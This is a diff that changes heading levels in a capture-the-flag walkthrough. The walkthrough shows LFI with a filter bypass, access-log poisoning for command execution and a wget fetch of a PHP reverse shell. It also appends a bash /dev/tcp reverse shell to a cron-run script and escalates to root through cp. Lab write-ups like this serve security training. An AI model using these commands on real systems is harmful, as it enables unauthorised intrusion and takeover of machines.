@@ -10,7 +10,7 @@ We shall tackle some awesome topics which include:
   3. Web exploitation.
 With that said let us get right to it
 
-# NMAP scan.
+## NMAP scan.
 As usual we are gonna start of by scanning open ports on our machine.
 ![](https://i.ibb.co/ZVjYSZ9/nmap.png)
 
@@ -22,7 +22,7 @@ we are able to view a home page which does not have alot on it but we can see a 
 We can actually use this and and it to our **/etc/hosts** file, then try and go to the page.
 ![](https://i.ibb.co/TWTBYN0/mafia.png)
 
-# LFI.
+## LFI.
 Okay guys it is about to get really messy in here. Stay frosty.
 
 So first of all we are going to FUZZ for hidden directories.
@@ -48,7 +48,7 @@ let us try and change **mrrobot.php** to **test.php**. And we can see some more 
 ![](https://i.ibb.co/944fSfv/lfiflag.png)
 
 And we can get a flag but also we can see some php filters on it.
-# Acesslog
+## Acesslog
 Okay so the filter dictates that using **../..** which we can easily bypasss by using **..//..**
 
 Next let us try and view the access log using the bypass.
@@ -71,7 +71,7 @@ let us try and add **&cmd=ls** to the end of the url.
 
 We can actually run commands on it. so next let us try and get a reverse shell.
 
-# SHELL
+## SHELL
 So we are going to get a sample php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 Next, we are going to set up a python server on our machine. 
 Next, we are going to run **&cmd=wget http://ip/revshell.php**
@@ -85,7 +85,7 @@ going back to our listener we have a shell.
 ![](https://i.ibb.co/gzQvS34/nc.png)
 
 
-# Switch user.
+## Switch user.
 
 So next we can get a better shell by using **python3 -c "import pty;pty.spawn('/bin/bash -i')"**
 
@@ -98,7 +98,7 @@ So we then run **echo "bash -i >& /dev/tcp/ip/1235 0>&1" >> /opt/helloworld.sh**
 
 Then run another listener and wait for a minute. Coffee break.
 
-# ROOT
+## ROOT
 
 Moving into the secret directory we can see a file called backup. Running does not do much so we are going to do something crazy. 
 So type:
@@ -125,7 +125,7 @@ Overall, these commands create a file called `cp` with elevated permissions, mod
 And yes we are root.
 ![](https://i.ibb.co/tCf2k5W/root.png)
 
-# RESOURCES
+## RESOURCES
 [BASH FOR BEGINNERS](https://www.tldp.org/LDP/Bash-Beginners-Guide/html/)
 [PHP TRICKS](https://devansh.xyz/ctfs/2021/09/11/php-tricks.html)
 
